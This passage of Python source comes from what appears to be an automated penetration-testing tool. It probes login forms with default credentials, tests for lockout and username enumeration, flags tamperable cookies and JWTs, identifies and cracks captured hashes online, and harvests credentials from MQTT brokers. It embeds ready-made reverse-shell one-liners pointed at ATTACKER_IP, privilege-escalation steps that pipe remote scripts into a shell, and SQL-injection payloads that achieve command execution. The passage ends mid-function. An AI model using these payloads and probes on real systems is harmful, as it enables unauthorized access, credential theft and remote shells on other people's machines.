    # literal role assignment (e.g. admin=0, role=user, isAdmin=false)
    if re.fullmatch(r'(true|false|0|1|user|admin|guest|yes|no)', low):
        return f"plaintext value '{v}' (flip to escalate)"
    # any decoding layer that reveals JSON or role/privilege words
    for enc, dec in _cookie_decodings(v):
        if enc == 'url' and dec == v:
            continue
        if dec and (dec.strip().startswith(('{', '[')) or
                    any(w in dec.lower() for w in _ROLE_WORDS)):
            return f"{enc} decodes to tamperable data: {dec[:80]}"
    # short integer -> likely sequential user id
    if re.fullmatch(r'\d{1,6}', v):
        return f"numeric value '{v}' (likely sequential id — try incrementing)"
    return None


def analyze_cookies(header_text, is_https, loot):
    """WSTG-SESS-02: audit Set-Cookie flags + flag tamperable session/role cookies."""
    vulns = []
    for line in header_text.splitlines():
        if not line.lower().startswith('set-cookie:'):
            continue
        cookie = line.split(':', 1)[1].strip()
        nv = cookie.split(';', 1)[0]
        name = nv.split('=', 1)[0].strip()
        value = nv.split('=', 1)[1] if '=' in nv else ''
        attrs = cookie.lower()
        sess = any(h in name.lower() for h in _SESSION_COOKIE_HINTS)
        missing = []
        if sess and 'httponly' not in attrs:
            missing.append('HttpOnly')
        if sess and is_https and 'secure' not in attrs:
            missing.append('Secure')
        if sess and 'samesite' not in attrs:
            missing.append('SameSite')
        if missing:
            desc = f"Cookie '{name}' missing {', '.join(missing)}"
            if loot:
                loot.add('auth_findings', desc)
            vulns.append({'port': 0, 'service': 'http', 'product': 'session', 'version': '',
                         'desc': desc, 'cve': '',
                         'exploit': 'XSS/session theft risk (WSTG-SESS-02)', 'severity': 'medium'})
        reason = _cookie_tamper_reason(name, value)
        if reason:
            desc = f"Tamperable cookie '{name}': {reason}"
            if loot:
                loot.add('auth_findings', desc)
                loot.add_step(f"Auth: tamper cookie '{name}' -> {reason}")
            vulns.append({'port': 0, 'service': 'http', 'product': 'session', 'version': '',
                         'desc': desc, 'cve': '',
                         'exploit': f"resend request with modified '{name}' cookie",
                         'severity': 'high'})
    return vulns


def decode_and_flag_jwt(token, source, loot):
    """WSTG-SESS JWT: decode header/payload (stdlib) and flag alg:none, HS256
    (alg-confusion / weak-secret crack), missing/long exp, sensitive claims."""
    vulns = []
    parts = token.split('.')
    if len(parts) < 2:
        return vulns
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1])) if parts[1] else {}
    except Exception:
        return vulns
    alg = str(header.get('alg', '')).lower()
    if loot:
        loot.add('keys', f"JWT ({source}): alg={header.get('alg')} claims={list(payload)[:8]}")
    if alg in ('none', ''):
        vulns.append({'port': 0, 'service': 'http', 'product': 'JWT', 'version': '',
                     'desc': f'JWT accepts alg=none ({source}) — forge arbitrary tokens', 'cve': '',
                     'exploit': "craft {\"alg\":\"none\"} JWT with desired claims, no signature",
                     'severity': 'critical'})
        if loot:
            loot.add_step("Auth: forge alg:none JWT -> impersonate any user")
    elif alg.startswith('hs'):
        vulns.append({'port': 0, 'service': 'http', 'product': 'JWT', 'version': '',
                     'desc': f'JWT uses {header.get("alg")} ({source}) — HMAC secret crackable / alg-confusion',
                     'cve': '', 'exploit': f'hashcat -m 16500 <jwt> wordlist  (then re-sign)',
                     'severity': 'medium'})
    if 'exp' not in payload:
        vulns.append({'port': 0, 'service': 'http', 'product': 'JWT', 'version': '',
                     'desc': f'JWT has no exp claim ({source}) — token never expires', 'cve': '',
                     'exploit': 'replay token indefinitely', 'severity': 'medium'})
    if any(str(k).lower() in _ROLE_WORDS for k in payload):
        if loot:
            loot.add('auth_findings', f"JWT ({source}) carries role/privilege claims: "
                     + ','.join(k for k in payload if str(k).lower() in _ROLE_WORDS))
    return vulns


def detect_auth_surface(base_url, body, corpus, loot):
    """Find login form (action/method/fields/csrf) + auth-related endpoints."""
    surface = {'login_form': None, 'endpoints': set(), 'has_2fa': False,
               'has_oauth': False, 'has_reset': False}
    # login form: a <form> containing an input[type=password]
    for fm in re.finditer(r'<form\b[^>]*>(.*?)</form>', body or '', re.I | re.S):
        block = fm.group(0)
        if re.search(r'type=["\']?password', block, re.I):
            action = (re.search(r'action=["\']([^"\']*)["\']', block, re.I) or [None, ''])[1]
            method = (re.search(r'method=["\']([^"\']*)["\']', block, re.I) or [None, 'post'])[1]
            names = re.findall(r'name=["\']([^"\']+)["\']', block, re.I)
            pass_f = next((n for n in names if 'pass' in n.lower()), 'password')
            user_f = next((n for n in names if any(u in n.lower() for u in
                          ('user', 'email', 'login', 'name', 'uid'))), 'username')
            csrf_f = next((n for n in names if any(c in n.lower() for c in
                          ('csrf', 'token', '_token', 'authenticity'))), None)
            surface['login_form'] = {'action': action or base_url, 'method': method.lower(),
                                     'fields': names, 'user': user_f, 'pass': pass_f, 'csrf': csrf_f}
            break
    urls = list(corpus.get('urls', [])) + [base_url]
    blob = ' '.join(urls) + ' ' + (body or '')[:5000]
    for pat, key in ((r'(?i)/(login|signin|auth|session)', 'endpoints'),
                     (r'(?i)/(register|signup)', 'endpoints'),
                     (r'(?i)/(logout|signout)', 'endpoints')):
        for m in re.finditer(pat, blob):
            surface['endpoints'].add(m.group(0))
    surface['has_2fa'] = bool(re.search(r'(?i)(2fa|mfa|otp|one[- ]time|verify.?code|totp|authenticator)', blob))
    surface['has_oauth'] = bool(re.search(r'(?i)(/oauth|/authorize|client_id=|response_type=|/saml|/sso|redirect_uri=)', blob))
    surface['has_reset'] = bool(re.search(r'(?i)(reset.?password|forgot.?password|/recover|reset.?token)', blob))
    if loot and surface['login_form']:
        loot.add('auth_findings', f"login form at {surface['login_form']['action']} "
                 f"(user={surface['login_form']['user']}, csrf={'yes' if surface['login_form']['csrf'] else 'NO'})")
    return surface


class AuthProbe:
    """Minimal curl-backed login-form client: submit creds, return a response
    fingerprint (status, body length, location, elapsed) for diffing."""
    def __init__(self, base_url, form):
        from urllib.parse import urljoin
        self.url = urljoin(base_url + '/', form['action']) if not form['action'].startswith('http') else form['action']
        self.form = form

    def attempt(self, user, pw):
        data = []
        for f in self.form['fields']:
            if f == self.form['user']:
                data += ['--data-urlencode', f'{f}={user}']
            elif f == self.form['pass']:
                data += ['--data-urlencode', f'{f}={pw}']
            else:
                data += ['--data-urlencode', f'{f}=x']
        if self.form['user'] not in self.form['fields']:
            data += ['--data-urlencode', f"{self.form['user']}={user}"]
            data += ['--data-urlencode', f"{self.form['pass']}={pw}"]
        t0 = time.time()
        rc, out, _ = _run(['curl', '-sik', '-o', '-', '-w', '\\n__HTTP_%{http_code}__',
                          '--max-time', '15'] + data + [self.url], timeout=20)
        elapsed = time.time() - t0
        code = (re.search(r'__HTTP_(\d+)__', out) or [None, '0'])[1]
        loc = (re.search(r'(?im)^location:\s*(.+)$', out) or [None, ''])[1].strip()
        setck = bool(re.search(r'(?im)^set-cookie:', out))
        return {'code': code, 'len': len(out), 'loc': loc, 'setcookie': setck,
                'elapsed': elapsed, 'body': out}


_DEFAULT_LOGIN_CREDS = [('admin', 'admin'), ('admin', 'password'), ('admin', ''),
                        ('administrator', 'administrator'), ('root', 'root'),
                        ('admin', 'admin123'), ('test', 'test'), ('guest', 'guest')]


def run_auth_suite(url, port, corpus, outdir, args, tools, loot=None):
    """Broken-auth / session / auth-logic testing for one HTTP service.
    Tier 1 passive (always) + Tier 2 active (gated) + Tier 3 recommend."""
    vulns = []
    if not shutil.which('curl'):
        return vulns
    is_https = url.lower().startswith('https')
    _, resp, _ = _run(['curl', '-sik', '-L', '--max-time', '12', url], timeout=15)
    head, _, body = resp.partition('\r\n\r\n')
    if not body:
        head, _, body = resp.partition('\n\n')
    body = body[:200000]
    (outdir / f'auth_headers_{port}.txt').write_text(head[:20000])

    # ── Tier 1: passive ──
    vulns += analyze_cookies(head, is_https, loot)

    seen_jwt = set()
    for m in _JWT_RE.finditer(head + ' ' + body + ' ' + ' '.join(corpus.get('urls', []))):
        tok = m.group(0)
        if tok not in seen_jwt:
            seen_jwt.add(tok)
            vulns += decode_and_flag_jwt(tok, f'{url}', loot)

    for u in corpus.get('urls', []):
        q = u.split('?', 1)[1].lower() if '?' in u else ''
        if any(f'{p}=' in q for p in _URL_SESSION_PARAMS):
            if loot:
                loot.add('auth_findings', f"session/token in URL (leaks via referrer/logs): {u}")
            vulns.append({'port': port, 'service': 'http', 'product': 'session', 'version': '',
                         'desc': 'Session identifier / token passed in URL (WSTG-SESS-04)', 'cve': '',
                         'exploit': 'token leaks in Referer, history, proxy logs', 'severity': 'medium'})
            break

    if re.search(r'(?im)^www-authenticate:\s*basic', head) and not is_https:
        vulns.append({'port': port, 'service': 'http', 'product': 'auth', 'version': '',
                     'desc': 'HTTP Basic auth over cleartext HTTP (WSTG-ATHN-01)', 'cve': '',
                     'exploit': 'credentials base64-only, sniffable', 'severity': 'high'})

    surface = detect_auth_surface(url, body, corpus, loot)
    lf = surface['login_form']
    if lf:
        if is_https and lf['action'].startswith('http://'):
            vulns.append({'port': port, 'service': 'http', 'product': 'auth', 'version': '',
                         'desc': 'Login form submits credentials over cleartext HTTP (WSTG-ATHN-01)',
                         'cve': '', 'exploit': lf['action'], 'severity': 'high'})
        if not lf['csrf']:
            vulns.append({'port': port, 'service': 'http', 'product': 'auth', 'version': '',
                         'desc': 'Login/state-changing form without anti-CSRF token (WSTG-SESS-05)',
                         'cve': '', 'exploit': 'craft cross-site POST', 'severity': 'medium'})
    if lf and 'no-store' not in head.lower():
        if loot:
            loot.add('auth_findings', 'auth page not marked Cache-Control: no-store (WSTG-ATHN-06)')

    # ── Tier 2: active probes (gated) ──
    if lf and not active_enabled(args):
        _recommend(loot, f"hydra/AuthProbe default-creds + lockout test on {lf['action']}",
                   "active auth probes (enable with --active)")
    elif lf and active_enabled(args):
        subsection("Broken-Auth Active Probes")
        probe = AuthProbe(url, lf)
        # baseline: a definitely-invalid login
        base = probe.attempt('zz_nolock_%d' % (int(time.time()) % 100000), 'zWrongPw!123')
        # default creds
        ulist = getattr(args, 'userlist', None)
        for u, p in _DEFAULT_LOGIN_CREDS:
            r = probe.attempt(u, p)
            if (r['loc'] and 'login' not in r['loc'].lower() and r['code'] in ('301', '302')) \
               or (r['setcookie'] and abs(r['len'] - base['len']) > 80) \
               or (r['code'] == '200' and abs(r['len'] - base['len']) > 200
                   and not re.search(r'(?i)invalid|incorrect|failed|error', r['body'][:3000])):
                good(f"  possible valid login: {u}:{p or '<blank>'}")
                if loot:
                    loot.add_cred(u, p, source='default-cred(form)', scope='web', verified=False)
                    loot.add_step(f"Foothold: default web creds {u}:{p or '<blank>'}")
                vulns.append({'port': port, 'service': 'http', 'product': 'login', 'version': '',
                             'desc': f'Default/weak web credential accepted: {u}:{p or "<blank>"}',
                             'cve': '', 'exploit': f'login at {lf["action"]} as {u}:{p}',
                             'severity': 'high'})
                break
        # weak lockout: hammer a THROWAWAY user, look for lockout/rate-limit signal
        throwaway = 'zz_nolock_%d' % (int(time.time()) % 100000)
        locked = False
        for _ in range(6):
            r = probe.attempt(throwaway, 'x%d' % time.time())
            if r['code'] in ('429',) or re.search(r'(?i)locked|too many|rate.?limit|captcha|try again later',
                                                   r['body'][:3000]):
                locked = True
                break
        if not locked:
            vulns.append({'port': port, 'service': 'http', 'product': 'login', 'version': '',
                         'desc': 'No account lockout / rate limiting on login (WSTG-ATHN-03)',
                         'cve': '', 'exploit': f'hydra http-post-form on {lf["action"]}',
                         'severity': 'medium'})
        # username enumeration: candidate users vs the known-bad baseline
        cands = list(dict.fromkeys(getattr(loot, 'usernames', [])))[:8] if loot else []
        enum_hits = []
        for cu in cands:
            r = probe.attempt(cu, 'zWrongPw!123')
            if abs(r['len'] - base['len']) > 120 or r['code'] != base['code'] \
               or (r['elapsed'] - base['elapsed'] > 1.0):
                enum_hits.append(cu)
        if enum_hits:
            if loot:
                loot.add('auth_findings', f"username enumeration: {', '.join(enum_hits[:10])}")
            vulns.append({'port': port, 'service': 'http', 'product': 'login', 'version': '',
                         'desc': f'Username enumeration via login response diff ({len(enum_hits)} users)',
                         'cve': '', 'exploit': 'valid usernames distinguishable', 'severity': 'low'})

    # auth-schema bypass (403/401 header tricks) — gated active else recommend
    if not active_enabled(args):
        _recommend(loot, f"for h in X-Original-URL X-Rewrite-URL X-Forwarded-For; do "
                   f"curl -sk -H \"$h: 127.0.0.1\" {url}/admin; done",
                   "auth-schema bypass on 401/403 paths (WSTG-ATHN-04)")

    # ── Tier 3: logic-flaw playbook (detect surface -> recommend) ──
    if surface['has_2fa']:
        _recommend(loot, f"MFA: step-skip to post-login URL; replay OTP; brute OTP (no rate limit); "
                   f"check /api/me for backup codes", "2FA/MFA bypass playbook")
    if surface['has_oauth']:
        _recommend(loot, f"OAuth/SSO: tamper redirect_uri; drop/replay state (CSRF); token/audience "
                   f"confusion; SAML signature strip/XSW", "OAuth/SSO auth-logic playbook")
    if surface['has_reset']:
        _recommend(loot, f"Reset: Host-header poison the reset link; test token predictability & "
                   f"non-invalidation; reset without old password", "password-reset logic playbook")
    return vulns


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HASH IDENTIFICATION + CRACKING  and  REVERSE-SHELL PAYLOADS (pentestmonkey)
# ------------------------------------------------------------------------
# Hash identification is local/passive. Online cracking (crackcrypt.com) sends
# the hash to a third party, so it is gated behind --crack or --active; when off
# a ready-to-run hashcat/john + curl command is recommended instead.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# crackcrypt.com supports these unsalted algs; each maps to a hashcat mode too.
_CRACKCRYPT_ALGS = {'md5', 'sha1', 'ntlm', 'sha256', 'sha512'}
_CRACKCRYPT_LAST = [0.0]  # rate-limit state: 1 req/s per API terms


def identify_hash(h, source_hint=''):
    """Identify likely hash type(s). Returns [(label, hashcat_mode, crackcrypt_alg|None)].
    For the md5/ntlm 32-hex ambiguity, order by source context (SMB/AD => ntlm)."""
    h = h.strip()
    if re.fullmatch(r'\$2[aby]\$\d\d\$[./A-Za-z0-9]{53}', h):
        return [('bcrypt', 3200, None)]
    if re.fullmatch(r'\$6\$[^$]{1,64}\$[./A-Za-z0-9]{86}', h):
        return [('sha512crypt', 1800, None)]
    if re.fullmatch(r'\$5\$[^$]{1,64}\$[./A-Za-z0-9]{43}', h):
        return [('sha256crypt', 7400, None)]
    if re.fullmatch(r'\$1\$[^$]{1,8}\$[./A-Za-z0-9]{22}', h):
        return [('md5crypt', 500, None)]
    if h.startswith('$krb5tgs$'):
        return [('kerberoast-TGS', 13100, None)]
    if h.startswith('$krb5asrep$') or h.startswith('$krb5asrep$23$'):
        return [('AS-REP', 18200, None)]
    if h.count(':') >= 6 and re.search(r'[0-9a-fA-F]{32}:[0-9a-fA-F]{32}', h):
        return [('NetNTLMv2/pwdump', 5600, None)]
    if re.fullmatch(r'[0-9a-fA-F]{32}', h):
        ad = any(k in source_hint.lower() for k in ('smb', 'ad', 'ntds', 'sam', 'netexec', 'nxc', 'domain'))
        opts = [('ntlm', 1000, 'ntlm'), ('md5', 0, 'md5')]
        return opts if ad else opts[::-1]
    if re.fullmatch(r'[0-9a-fA-F]{40}', h):
        return [('sha1', 100, 'sha1')]
    if re.fullmatch(r'[0-9a-fA-F]{64}', h):
        return [('sha256', 1400, 'sha256')]
    if re.fullmatch(r'[0-9a-fA-F]{128}', h):
        return [('sha512', 1700, 'sha512')]
    return []


def crack_hash_online(h, alg, timeout=15):
    """Look up an unsalted hash on crackcrypt.com (rate-limited 1 req/s).
    Returns plaintext or None. Only call for algs in _CRACKCRYPT_ALGS."""
    if alg not in _CRACKCRYPT_ALGS:
        return None
    dt = time.time() - _CRACKCRYPT_LAST[0]
    if dt < 1.1:
        time.sleep(1.1 - dt)
    _CRACKCRYPT_LAST[0] = time.time()
    try:
        payload = json.dumps({'hash': h, 'alg': alg}).encode()
        req = Request('https://crackcrypt.com/api/v1/lookup', data=payload,
                      headers={'Content-Type': 'application/json',
                               'User-Agent': f'SmartNmap/{VERSION}'})
        with urlopen(req, timeout=timeout) as resp:
            data = json.loads(resp.read().decode('utf-8', 'ignore'))
        return data.get('plaintext') if data.get('found') else None
    except Exception:
        return None


def _gather_hashes(loot, outdir):
    """Collect candidate hashes from loot + on-disk artifacts, with a source hint."""
    found = {}  # hash -> source hint

    def _scan(text, src):
        for m in re.finditer(r'\$(?:krb5tgs|krb5asrep|2[aby]|6|5|1)\$\S+', text):
            found.setdefault(m.group(0), src)
        for m in re.finditer(r'\b[0-9a-fA-F]{32,128}\b', text):
            if len(m.group(0)) in (32, 40, 64, 128):
                found.setdefault(m.group(0), src)
        # shadow / pwdump style user:hash
        for m in re.finditer(r'^([^:\s]+):(\$\S+|[0-9a-fA-F]{32,}:[0-9a-fA-F]{32,}|[0-9a-fA-F]{32,128})',
                             text, re.M):
            found.setdefault(m.group(2), f'{src}:user={m.group(1)}')

    for bucket in ('keys', 'creds', 'notes', 'files'):
        for item in getattr(loot, bucket, []):
            _scan(str(item), bucket)
    for fn in ('kerberoast.hash', 'asrep.hash'):
        p = outdir / fn
        if p.exists():
            _scan(p.read_text(errors='ignore'), fn)
    # mined share/LFI files that look like shadow/passwd
    for p in list((outdir / 'share_loot').rglob('*')) if (outdir / 'share_loot').exists() else []:
        if p.is_file() and p.stat().st_size < 2_000_000 and p.name in ('shadow', 'passwd', 'sam', 'ntds.dit'):
            try:
                _scan(p.read_text(errors='ignore'), f'share:{p.name}')
            except Exception:
                pass
    return found


def _krb_username(h):
    m = re.search(r'\$krb5(?:tgs|asrep)\$\d+\$\*?([^*$]+?)[\*$]', h)
    return m.group(1).split('/')[0] if m else None


def run_hash_cracking(target, services, outdir, args, tools, loot=None, context=None):
    """Identify every captured hash, recommend the exact hashcat/john command, and
    (gated) look unsalted hashes up on crackcrypt.com. Cracked plaintexts feed the
    credential state machine -> reuse sweep. Uses AI to disambiguate when available."""
    vulns = []
    if loot is None:
        return vulns
    hashes = _gather_hashes(loot, outdir)
    if not hashes:
        return vulns
    online = active_enabled(args) or getattr(args, 'crack', False)
    subsection("Hash Identification & Cracking")
    cracked = []
    for h, src in list(hashes.items())[:50]:
        cands = identify_hash(h, src)
        if not cands:
            continue
        # AI disambiguation for the md5/ntlm case, if an API key is configured
        if len(cands) == 2 and getattr(args, 'api_key', '') and cands[0][0] in ('md5', 'ntlm'):
            try:
                ans = query_ai(f"A 32-hex hash '{h[:16]}...' was found via '{src}'. "
                               f"Answer with exactly one word: md5 or ntlm.",
                               api_key=args.api_key, timeout=20) or ''
                if 'ntlm' in ans.lower():
                    cands = [c for c in cands if c[0] == 'ntlm'] + [c for c in cands if c[0] != 'ntlm']
                elif 'md5' in ans.lower():
                    cands = [c for c in cands if c[0] == 'md5'] + [c for c in cands if c[0] != 'md5']
            except Exception:
                pass
        label, mode, cc_alg = cands[0]
        alt = f" (or {'/'.join(c[0] for c in cands[1:])})" if len(cands) > 1 else ''
        info(f"hash {h[:24]}… → {label}{alt}  [hashcat -m {mode}]")
        if loot:
            loot.add('notes', f"hash ({src}): {label} hashcat -m {mode}")
        plaintext = None
        if online and cc_alg:
            plaintext = crack_hash_online(h, cc_alg)
            # try the alternate alg too (e.g. md5 vs ntlm)
            for c in cands[1:]:
                if plaintext:
                    break
                if c[2]:
                    plaintext = crack_hash_online(h, c[2])
                    if plaintext:
                        label, mode = c[0], c[1]
        if plaintext:
            good(f"  CRACKED ({label}): {h[:16]}… = {plaintext}")
            cracked.append(plaintext)
            user = _krb_username(h) or (re.search(r'user=([^:\s]+)', src) or [None, None])[1]
            if loot:
                if user:
                    loot.add_cred(user, plaintext, source=f'crack:{label}', scope='domain', verified=True)
                    loot.add_step(f"Cracked {label} hash for {user} = {plaintext}")
                else:
                    loot.add('creds', f'cracked {label}: {plaintext}')
                    loot.add_step(f"Cracked {label} hash = {plaintext} (candidate password)")
            vulns.append({'port': 0, 'service': 'hash', 'product': label, 'version': '',
                         'desc': f'{label} hash cracked to "{plaintext}"'
                                 + (f' (user {user})' if user else ''),
                         'cve': '', 'exploit': f'reuse credential {user or "?"}:{plaintext}',
                         'severity': 'high'})
        else:
            wl = '/usr/share/wordlists/rockyou.txt'
            if online and cc_alg:
                _recommend(loot, f"curl -s -X POST https://crackcrypt.com/api/v1/lookup "
                           f"-H 'Content-Type: application/json' -d '{{\"hash\":\"{h[:24]}…\",\"alg\":\"{cc_alg}\"}}'",
                           f"online lookup {label}")
            _recommend(loot, f"hashcat -m {mode} '{h[:40]}…' {wl}   # or: john --format=…",
                       f"crack {label} hash from {src}")
    if cracked:
        (outdir / 'cracked_passwords.txt').write_text('\n'.join(sorted(set(cracked))))
    return vulns


# ── Reverse-shell payloads (pentestmonkey cheat sheet) ────────────────────
def reverse_shell_payloads(lhost, lport):
    """Canonical pentestmonkey reverse-shell one-liners + common upgrades."""
    py = ("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,"
          "socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0);"
          "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
          "import pty;pty.spawn(\"/bin/bash\")'" % (lhost, lport))
    return {
        'bash':       f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
        'bash-5555':  f'0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196',
        'nc-e':       f'nc -e /bin/sh {lhost} {lport}',
        'nc-mkfifo':  f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
        'python3':    py,
        'perl':       (f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
                       "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                       "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");"
                       "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"),
        'php':        f'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
        'ruby':       (f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;"
                       "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
        'powershell': (f'powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});'
                       '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0)'
                       '{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);'
                       '$sb2=$sb+\'PS \'+(pwd).Path+\'> \';$sby=([text.encoding]::ASCII).GetBytes($sb2);'
                       '$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"'),
        'socat':      f'socat TCP:{lhost}:{lport} EXEC:/bin/sh',
        'pty-upgrade': "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' ; # then: Ctrl-Z; stty raw -echo; fg",
    }


_RCE_KEYWORDS = ('command injection', 'shellshock', 'os command', 'local file inclusion',
                 'file upload', 'default/weak web credential', 'rce', 'remote code',
                 'deserial', 'sql injection')


def emit_reverse_shells(vulns, args, loot):
    """When a foothold/RCE finding exists, drop pentestmonkey reverse shells into
    the report (uses --lhost/--lport, else placeholders)."""
    if not any(any(k in v.get('desc', '').lower() for k in _RCE_KEYWORDS) for v in vulns):
        return
    lhost = getattr(args, 'lhost', None) or 'ATTACKER_IP'
    lport = getattr(args, 'lport', None) or '4444'
    if loot:
        loot.add('recommend', f"# --- Reverse shells (pentestmonkey) — set up: nc -lvnp {lport} ---")
        for name, payload in reverse_shell_payloads(lhost, lport).items():
            loot.add('recommend', f"[revshell:{name}] {payload}")


# ── Privilege-escalation hand-off (pentestmonkey unix-privesc-check + GTFOBins) ──
_LINUX_PRIVESC = [
    "sudo -l                                  # sudo rights -> GTFOBins",
    "find / -perm -4000 -type f 2>/dev/null   # SUID binaries -> GTFOBins",
    "getcap -r / 2>/dev/null                  # file capabilities (cap_setuid)",
    "cat /etc/crontab; ls -la /etc/cron.*     # writable/root cron jobs",
    "grep -rl . /etc/passwd -w 2>/dev/null; ls -l /etc/passwd  # writable /etc/passwd",
    "ls -la /home/*/.ssh /root/.ssh 2>/dev/null; find / -name id_rsa 2>/dev/null",
    "ps aux --forest; ss -ltnp                # local services / pspy for cron",
    "wget http://LHOST/unix-privesc-check -O upc; sh upc standard   # pentestmonkey",
    "curl http://LHOST/linpeas.sh | sh        # linPEAS full sweep",
    "# any SUID/sudo binary -> https://gtfobins.github.io/#<binary>",
]
_WINDOWS_PRIVESC = [
    "whoami /priv                             # SeImpersonate/SeAssignPrimaryToken -> PrintSpoofer/GodPotato",
    "whoami /groups; net user %USERNAME%",
    "systeminfo                               # -> windows-exploit-suggester / wesng",
    "powershell -c iex(iwr http://LHOST/winPEAS.ps1 -UseBasicParsing)",
    "wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v \"C:\\\\Windows\"  # unquoted paths",
    "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services  # weak service perms (accesschk)",
    "cmdkey /list; dir /s *.kdbx *.config unattend.xml    # stored creds",
]
# SQL-injection auth-bypass / enumeration cheat sheet (pentestmonkey style)
_SQLI_CHEATS = [
    "auth bypass:  ' OR '1'='1'-- -   |   admin'-- -   |   ' OR 1=1#   |   \") OR (\"1\"=\"1",
    "UNION cols:   ' ORDER BY 1-- -  (increment until error)  then  ' UNION SELECT 1,2,3-- -",
    "MySQL enum:   ' UNION SELECT schema_name,2 FROM information_schema.schemata-- -",
    "MySQL creds:  ' UNION SELECT user,password FROM mysql.user-- -",
    "MSSQL RCE:    '; EXEC xp_cmdshell 'whoami'-- -   (if sysadmin + xp_cmdshell enabled)",
    "Postgres RCE: '; COPY (SELECT '') TO PROGRAM 'id'-- -",
    "time-blind:   ' OR SLEEP(5)-- -  (MySQL) | ' WAITFOR DELAY '0:0:5'-- - (MSSQL)",
    "automate:     sqlmap -u '<url>' --batch --dbs  (then --dump / --os-shell)",
]


def emit_privesc_checklist(os_info, services, loot):
    """P2 hand-off: OS-keyed privesc checklist (the tool has no shell, so it hands
    the operator the exact next steps once a foothold is obtained)."""
    if not loot:
        return
    name = ' '.join(str(o.get('name', '')) for o in (os_info or [])).lower()
    svc = ' '.join(s.get('service', '').lower() for s in services.values())
    is_win = 'windows' in name or any(p in services for p in (3389, 445, 5985)) or 'microsoft-ds' in svc
    steps = _WINDOWS_PRIVESC if is_win else _LINUX_PRIVESC
    loot.add('recommend', f"# --- Privilege escalation checklist ({'Windows' if is_win else 'Linux'}) ---")
    for s in steps:
        loot.add('recommend', f"[privesc] {s}")


def emit_sqli_cheatsheet(vulns, corpus_params, loot):
    """Drop a SQLi auth-bypass/enum cheat sheet when SQLi is found or a param/login
    surface exists that warrants manual testing."""
    if not loot:
        return
    relevant = any('sql' in v.get('desc', '').lower() for v in vulns) or bool(corpus_params)
    if not relevant:
        return
    loot.add('recommend', "# --- SQL injection cheat sheet (pentestmonkey) ---")
    for c in _SQLI_CHEATS:
        loot.add('recommend', f"[sqli] {c}")


def run_mqtt_suite(target, services, outdir, args, tools, loot=None):
    """MQTT (1883/8883) enumeration: anonymously subscribe to '#' and harvest
    retained messages — a classic IoT/broker foothold where creds leak in the
    message stream. Uses mosquitto_sub if present, else the built-in nmap
    mqtt-subscribe NSE. Harvested creds feed the credential state machine."""
    vulns = []
    mqtt_ports = [p for p, s in services.items()
                  if 'mqtt' in s.get('service', '').lower() or p in (1883, 8883)]
    if not mqtt_ports:
        return vulns
    subsection("MQTT Enumeration")
    for port in mqtt_ports:
        msgs = ''
        if shutil.which('mosquitto_sub') and shutil.which('timeout'):
            listen = getattr(args, 'mqtt_listen', None) or ('20' if _low_intensity(args) else '45')
            info(f"mosquitto_sub -t '#' on {target}:{port} (listening {listen}s for live messages)")
            # 'timeout' bounds the persistent subscriber so captured output is preserved
            _, msgs, _ = _run(['timeout', listen, 'mosquitto_sub', '-h', target, '-p', str(port),
                              '-t', '#', '-t', '$SYS/#', '-v'], timeout=int(listen) + 15)
        else:
            info(f"nmap mqtt-subscribe NSE on {target}:{port}")
            txt = outdir / f'mqtt_{port}.txt'
            _run(['nmap', '-p', str(port), '--script', 'mqtt-subscribe',
                 '--script-args', 'mqtt-subscribe.timeout=20s,mqtt-subscribe.listen-msgs=400',
                 '-oN', str(txt), '-Pn', '-n', target], timeout=90)
            msgs = txt.read_text() if txt.exists() else ''
        (outdir / f'mqtt_{port}_messages.txt').write_text(msgs)
        # meaningful content = messages beyond nmap boilerplate
        content = '\n'.join(l for l in msgs.splitlines()
                            if l.strip() and not re.match(r'\s*(Starting Nmap|Nmap done|Host is|PORT|'
                                                          r'\d+/tcp|Service Info|Service detection|'
                                                          r'Nmap scan report)', l))
        if content.strip():
            good(f"MQTT anonymous subscribe OK on {port} — messages captured")
            for line in content.splitlines()[:40]:
                print(f"    {line.strip()[:200]}")
            if loot:
                loot.add('notes', f"MQTT broker {port}: anonymous subscribe allowed")
                loot.scan_output(content)
                loot.add_step(f"Foothold: MQTT anon subscribe on {port} -> harvest messages")
                # explicit user/pass harvesting from message payloads
                for m in re.finditer(r'(?i)(user(?:name)?|login)["\':=\s]+([^\s"\',:}]{2,})[^\n]*?'
                                     r'(?:pass(?:word)?|pwd)["\':=\s]+([^\s"\',}]{2,})', content):
                    loot.add_cred(m.group(2), m.group(3), source=f'mqtt:{port}', scope='unknown', verified=False)
                    good(f"  MQTT candidate cred: {m.group(2)}:{m.group(3)}")
                for m in re.finditer(r'\b([A-Za-z0-9._-]{3,})\s*[:/]\s*([^\s"\']{4,})\b', content):
